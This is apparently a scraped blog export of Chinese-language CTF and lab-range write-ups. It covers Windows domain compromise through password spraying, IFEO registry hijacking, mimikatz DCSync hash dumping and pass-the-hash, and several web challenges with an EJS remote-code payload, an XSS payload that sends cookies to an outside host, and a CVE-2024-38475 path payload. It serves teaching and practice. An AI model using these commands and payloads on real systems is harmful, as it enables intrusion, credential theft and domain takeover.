9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, 